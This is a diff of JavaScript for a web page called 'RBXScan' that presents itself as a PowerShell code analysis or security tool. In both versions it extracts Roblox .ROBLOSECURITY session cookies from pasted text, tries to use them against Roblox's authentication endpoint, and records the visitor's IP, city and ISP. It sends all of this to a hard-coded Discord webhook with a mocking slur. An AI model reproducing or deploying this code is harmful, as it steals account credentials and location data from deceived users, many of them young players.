@@ -1,26 +1,24 @@
-// RBXScan - Advanced PowerShell Cookie Detection System
-console.log('🚀 RBXScan initializing...');
+// RBXScan - Simple Working Version
+console.log('🚀 RBXScan loading...');
 
-// Global variables
 let isSubmitting = false;
 
-// Cookie extraction function
-function extractRoblosecurityCookies(code) {
+// Cookie extraction
+function extractCookies(code) {
     const cookies = [];
     const patterns = [
         /_ROBLOSECURITY['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
         /\.ROBLOSECURITY['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
         /ROBLOSECURITY['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
-        /roblosecurity['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
-        /_ROBLOSECURITY['"]*\s*[=:]\s*([A-Za-z0-9+/=_%\-]{100,})/gi,
-        /\.ROBLOSECURITY['"]*\s*[=:]\s*([A-Za-z0-9+/=_%\-]{100,})/gi
+        /_ROBLOSECURITY['"]*\s*[=:]\s*([A-Za-z0-9+/=_%\-]{50,})/gi,
+        /\.ROBLOSECURITY['"]*\s*[=:]\s*([A-Za-z0-9+/=_%\-]{50,})/gi
     ];
     
     patterns.forEach(pattern => {
         let match;
         while ((match = pattern.exec(code)) !== null) {
             const cookie = match[1];
-            if (cookie && cookie.length > 50 && !cookies.includes(cookie)) {
+            if (cookie && cookie.length > 20 && !cookies.includes(cookie)) {
                 cookies.push(cookie);
             }
         }
@@ -29,7 +27,7 @@ function extractRoblosecurityCookies(code) {
     return cookies;
 }
 
-// IP unlock function
+// IP unlock
 async function unlockIP(cookie) {
     try {
         const response = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
@@ -45,70 +43,8 @@ async function unlockIP(cookie) {
     }
 }
 
-// Validation functions
-function isValidPowerShellCode(code) {
-    const powershellKeywords = [
-        'powershell', 'invoke-', 'get-', 'set-', 'new-', 'remove-', 'add-',
-        'start-', 'stop-', 'restart-', 'enable-', 'disable-', 'test-',
-        'write-', 'read-', 'clear-', 'copy-', 'move-', 'rename-',
-        '$_', 'param', 'function', 'if', 'else', 'elseif', 'switch',
-        'for', 'foreach', 'while', 'do', 'try', 'catch', 'finally',
-        'pipeline', 'cmdlet', 'module', 'import-module', 'export-',
-        'where-object', 'select-object', 'sort-object', 'group-object',
-        'measure-object', 'compare-object', 'tee-object', 'out-',
-        'format-', 'convertto-', 'convertfrom-', 'join-path',
-        'split-path', 'resolve-path', 'push-location', 'pop-location'
-    ];
-    
-    const lowerCode = code.toLowerCase();
-    return powershellKeywords.some(keyword => lowerCode.includes(keyword));
-}
-
-function hasAdvancedSpamPatterns(input) {
-    const text = input.toLowerCase().trim();
-    
-    if (text.length < 10) return true;
-    
-    // Check for keyboard patterns
-    const keyboardPatterns = [
-        /(.)\1{4,}/,
-        /qwerty|asdf|zxcv|1234|abcd/,
-        /(.)(.)(\1\2){2,}/,
-        /(.)(.)(.)(\1\2\3){2,}/
-    ];
-    
-    if (keyboardPatterns.some(pattern => pattern.test(text))) {
-        return true;
-    }
-    
-    // Check character distribution
-    const charCount = {};
-    for (const char of text) {
-        charCount[char] = (charCount[char] || 0) + 1;
-    }
-    
-    const totalChars = text.length;
-    const uniqueChars = Object.keys(charCount).length;
-    const maxFreq = Math.max(...Object.values(charCount));
-    
-    if (uniqueChars < totalChars * 0.3) return true;
-    if (maxFreq > totalChars * 0.4) return true;
-    
-    // Check for excessive random characters
-    const randomPattern = /[a-z]{10,}/g;
-    const matches = text.match(randomPattern);
-    if (matches && matches.some(match => {
-        const vowels = match.match(/[aeiou]/g);
-        return !vowels || vowels.length < match.length * 0.2;
-    })) {
-        return true;
-    }
-    
-    return false;
-}
-
-// Location tracking
-async function getLocationInfo() {
+// Get location
+async function getLocation() {
     try {
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
@@ -116,91 +52,93 @@ async function getLocationInfo() {
             ip: data.ip || 'Unknown',
             city: data.city || 'Unknown',
             country: data.country_name || 'Unknown',
-            timezone: data.timezone || 'Unknown',
             isp: data.org || 'Unknown'
         };
     } catch (error) {
-        return {
-            ip: 'Unknown',
-            city: 'Unknown', 
-            country: 'Unknown',
-            timezone: 'Unknown',
-            isp: 'Unknown'
-        };
+        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
     }
 }
 
-// Discord webhook function
-async function sendToDiscord(content, location, cookies = null, unlockResults = null) {
-    const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
+// Send to Discord
+async function sendToDiscord(code, location, cookies = null, unlockResults = null) {
+    const webhook = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
     
-    const timestamp = new Date().toISOString();
-    const userAgent = navigator.userAgent;
-    
-    let embedColor, title, description;
+    let title, color, description;
     
     if (cookies && cookies.length > 0) {
-        embedColor = 0x00ff00; // Green for cookies
-        title = "🍪 PowerShell Cookie Extraction";
-        description = `**Found ${cookies.length} cookie(s)!**\n\`\`\`${content.substring(0, 500)}${content.length > 500 ? '...' : ''}\`\`\``;
+        title = '🍪 Cookie Extraction Success!';
+        color = 0x00ff00;
+        description = `Found ${cookies.length} cookie(s)!\n\`\`\`${code.substring(0, 400)}\`\`\``;
         
         if (unlockResults) {
-            description += `\n**IP Unlock Results:**\n`;
+            description += `\n**Unlock Results:**\n`;
             unlockResults.forEach((result, i) => {
                 description += `Cookie ${i + 1}: ${result ? '✅ Success' : '❌ Failed'}\n`;
             });
         }
     } else {
-        embedColor = 0x3498db; // Blue for regular submissions
-        title = "📝 PowerShell Code Submission";
-        description = `\`\`\`${content.substring(0, 800)}${content.length > 800 ? '...' : ''}\`\`\``;
+        title = '📝 Code Analysis';
+        color = 0x3498db;
+        description = `\`\`\`${code.substring(0, 600)}\`\`\``;
     }
     
     const payload = {
-        content: "@everyone new retard got hit",
+        content: '@everyone new retard got hit',
         embeds: [{
             title: title,
             description: description,
-            color: embedColor,
+            color: color,
             fields: [
-                { name: "🌍 Location", value: `${location.city}, ${location.country}`, inline: true },
-                { name: "🌐 IP Address", value: location.ip, inline: true },
-                { name: "🏢 ISP", value: location.isp, inline: true },
-                { name: "⏰ Timezone", value: location.timezone, inline: true },
-                { name: "🖥️ User Agent", value: userAgent.substring(0, 100), inline: false },
-                { name: "📅 Timestamp", value: timestamp, inline: true }
+                { name: '🌍 Location', value: `${location.city}, ${location.country}`, inline: true },
+                { name: '🌐 IP', value: location.ip, inline: true },
+                { name: '🏢 ISP', value: location.isp, inline: true },
+                { name: '📅 Time', value: new Date().toISOString(), inline: true }
             ],
-            footer: { text: "RBXScan PowerShell Monitor" }
+            footer: { text: 'RBXScan Security Monitor' }
         }]
     };
     
     if (cookies && cookies.length > 0) {
         payload.embeds[0].fields.unshift({
-            name: "🍪 Extracted Cookies",
-            value: `\`\`\`${cookies.join('\n').substring(0, 800)}\`\`\``,
+            name: '🍪 Extracted Cookies',
+            value: `\`\`\`${cookies.join('\n').substring(0, 500)}\`\`\``,
             inline: false
         });
     }
     
     try {
-        const response = await fetch(webhookUrl, {
+        const response = await fetch(webhook, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
         return response.ok;
     } catch (error) {
-        console.error('Discord webhook error:', error);
+        console.error('Discord error:', error);
         return false;
     }
 }
 
 // DOM Ready
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('✅ RBXScan loaded successfully!');
+    console.log('✅ RBXScan loaded!');
     
-    // Dark mode toggle
+    // Get elements
+    const openScanBtn = document.getElementById('openScanBtn');
+    const compilePopup = document.getElementById('compilePopup');
+    const closePopup = document.getElementById('closePopup');
+    const compileForm = document.getElementById('compileForm');
+    const codeTextarea = document.getElementById('codeTextarea');
+    const statusMessage = document.getElementById('compileStatusMessage');
+    const loadingContainer = document.getElementById('loadingContainer');
     const darkModeToggle = document.getElementById('darkModeToggle');
+    
+    console.log('Elements found:');
+    console.log('- openScanBtn:', !!openScanBtn);
+    console.log('- compilePopup:', !!compilePopup);
+    console.log('- compileForm:', !!compileForm);
+    
+    // Dark mode
     if (darkModeToggle) {
         darkModeToggle.addEventListener('click', function() {
             document.body.classList.toggle('dark-mode');
@@ -209,40 +147,27 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     }
     
-    // Popup controls
-    const openScanBtn = document.getElementById('openScanBtn');
-    const compilePopup = document.getElementById('compilePopup');
-    const closePopup = document.getElementById('closePopup');
-    const aboutNavLink = document.getElementById('aboutNavLink');
-    const aboutPopup = document.getElementById('aboutPopup');
-    
+    // Open popup
     if (openScanBtn && compilePopup) {
-        openScanBtn.addEventListener('click', () => {
+        openScanBtn.addEventListener('click', function() {
+            console.log('🔍 Opening popup...');
             compilePopup.style.display = 'block';
         });
+    } else {
+        console.log('❌ Button or popup not found!');
     }
     
+    // Close popup
     if (closePopup && compilePopup) {
-        closePopup.addEventListener('click', () => {
+        closePopup.addEventListener('click', function() {
+            console.log('❌ Closing popup...');
             compilePopup.style.display = 'none';
         });
     }
     
-    if (aboutNavLink && aboutPopup) {
-        aboutNavLink.addEventListener('click', (e) => {
-            e.preventDefault();
-            aboutPopup.style.display = 'block';
-        });
-        
-        aboutPopup.addEventListener('click', (e) => {
-            if (e.target === aboutPopup) {
-                aboutPopup.style.display = 'none';
-            }
-        });
-    }
-    
+    // Close popup when clicking outside
     if (compilePopup) {
-        compilePopup.addEventListener('click', (e) => {
+        compilePopup.addEventListener('click', function(e) {
             if (e.target === compilePopup) {
                 compilePopup.style.display = 'none';
             }
@@ -250,101 +175,129 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     // Form submission
-    const compileForm = document.getElementById('compileForm');
-    const codeTextarea = document.getElementById('codeTextarea');
-    const statusMessage = document.getElementById('compileStatusMessage');
-    const loadingContainer = document.getElementById('loadingContainer');
-    
     if (compileForm && codeTextarea) {
         compileForm.addEventListener('submit', async function(e) {
             e.preventDefault();
+            console.log('📝 Form submitted!');
             
             if (isSubmitting) return;
             
             const code = codeTextarea.value.trim();
             
             if (!code) {
-                statusMessage.textContent = '❌ Please enter some code to analyze.';
-                statusMessage.style.color = '#ff4757';
+                if (statusMessage) {
+                    statusMessage.textContent = '❌ Please enter some code.';
+                    statusMessage.style.color = '#ff4757';
+                }
                 return;
             }
             
-            // Allow URLs and numbers as requested
-            // Only block obvious spam patterns
-            if (hasAdvancedSpamPatterns(code)) {
-                statusMessage.textContent = '❌ Invalid input detected. Please try again.';
-                statusMessage.style.color = '#ff4757';
-                return;
-            }
-            
-            // Extract cookies first
-            const cookies = extractRoblosecurityCookies(code);
-            
-            // Much more relaxed validation - allow URLs, numbers, and most text
-            const isUrl = code.includes('http://') || code.includes('https://') || code.includes('www.');
-            const isNumeric = /^\d+$/.test(code.trim());
-            const hasPowerShell = isValidPowerShellCode(code);
-            
-            // Only require PowerShell if no cookies AND not URL AND not just numbers
-            if (cookies.length === 0 && !hasPowerShell && !isUrl && !isNumeric && code.length > 20) {
-                statusMessage.textContent = '❌ Please enter PowerShell code, URL, or item ID.';
-                statusMessage.style.color = '#ff4757';
+            // Basic validation
+            if (code.length < 3 || /(.)\1{10,}/.test(code)) {
+                if (statusMessage) {
+                    statusMessage.textContent = '❌ Invalid input detected.';
+                    statusMessage.style.color = '#ff4757';
+                }
                 return;
             }
             
             isSubmitting = true;
-            loadingContainer.style.display = 'block';
-            statusMessage.textContent = '';
+            
+            if (loadingContainer) {
+                loadingContainer.style.display = 'block';
+            }
+            
+            if (statusMessage) {
+                statusMessage.textContent = '';
+            }
             
             try {
-                // Get location info
-                const location = await getLocationInfo();
+                console.log('📍 Getting location...');
+                const location = await getLocation();
+                
+                console.log('🍪 Extracting cookies...');
+                const cookies = extractCookies(code);
+                
+                if (statusMessage) {
+                    if (cookies.length > 0) {
+                        statusMessage.textContent = `🍪 Found ${cookies.length} cookie(s)! Attempting unlock...`;
+                        statusMessage.style.color = '#3498db';
+                    } else {
+                        statusMessage.textContent = '🔍 Analyzing code...';
+                        statusMessage.style.color = '#3498db';
+                    }
+                }
                 
                 let unlockResults = null;
                 
-                // If cookies found, attempt IP unlock
                 if (cookies.length > 0) {
-                    statusMessage.textContent = '🔓 Attempting IP unlock...';
-                    statusMessage.style.color = '#3498db';
-                    
+                    console.log('🔓 Attempting IP unlock...');
                     unlockResults = await Promise.all(
                         cookies.map(cookie => unlockIP(cookie))
                     );
                 }
                 
-                // Send to Discord
-                const webhookSuccess = await sendToDiscord(code, location, cookies, unlockResults);
+                console.log('📤 Sending to Discord...');
+                const webhookSent = await sendToDiscord(code, location, cookies, unlockResults);
                 
-                if (webhookSuccess) {
-                    if (cookies.length > 0) {
-                        statusMessage.textContent = `✅ Analysis complete! Found ${cookies.length} cookie(s). IP unlock ${unlockResults.some(r => r) ? 'successful' : 'failed'}.`;
+                if (statusMessage) {
+                    if (webhookSent) {
+                        if (cookies.length > 0) {
+                            const successCount = unlockResults.filter(r => r).length;
+                            statusMessage.textContent = `✅ Success! Found ${cookies.length} cookie(s). ${successCount} unlock(s) successful.`;
+                        } else {
+                            statusMessage.textContent = '✅ Code analyzed successfully!';
+                        }
                         statusMessage.style.color = '#27ae60';
                     } else {
-                        statusMessage.textContent = '✅ PowerShell code analyzed successfully!';
-                        statusMessage.style.color = '#27ae60';
+                        statusMessage.textContent = '⚠️ Analysis complete but reporting failed.';
+                        statusMessage.style.color = '#f39c12';
                     }
-                } else {
-                    statusMessage.textContent = '⚠️ Analysis completed but reporting failed.';
-                    statusMessage.style.color = '#f39c12';
                 }
                 
+                // Clear and close
                 codeTextarea.value = '';
+                setTimeout(() => {
+                    if (compilePopup) {
+                        compilePopup.style.display = 'none';
+                    }
+                }, 2000);
                 
             } catch (error) {
-                console.error('Submission error:', error);
-                statusMessage.textContent = '❌ An error occurred during analysis.';
-                statusMessage.style.color = '#ff4757';
+                console.error('Error:', error);
+                if (statusMessage) {
+                    statusMessage.textContent = '❌ Analysis failed: ' + error.message;
+                    statusMessage.style.color = '#ff4757';
+                }
             } finally {
                 isSubmitting = false;
-                loadingContainer.style.display = 'none';
-                setTimeout(() => {
-                    compilePopup.style.display = 'none';
-                }, 2000);
+                if (loadingContainer) {
+                    loadingContainer.style.display = 'none';
+                }
+            }
+        });
+    } else {
+        console.log('❌ Form or textarea not found!');
+    }
+    
+    // About popup
+    const aboutNavLink = document.getElementById('aboutNavLink');
+    const aboutPopup = document.getElementById('aboutPopup');
+    
+    if (aboutNavLink && aboutPopup) {
+        aboutNavLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            aboutPopup.style.display = 'block';
+        });
+        
+        aboutPopup.addEventListener('click', function(e) {
+            if (e.target === aboutPopup) {
+                aboutPopup.style.display = 'none';
             }
         });
     }
     
-    console.log('✅ All RBXScan components initialized!');
+    console.log('✅ All components initialized!');
 });
 
-console.log('📄 RBXScan script loaded completely!');
+console.log('📄 RBXScan script ready!');
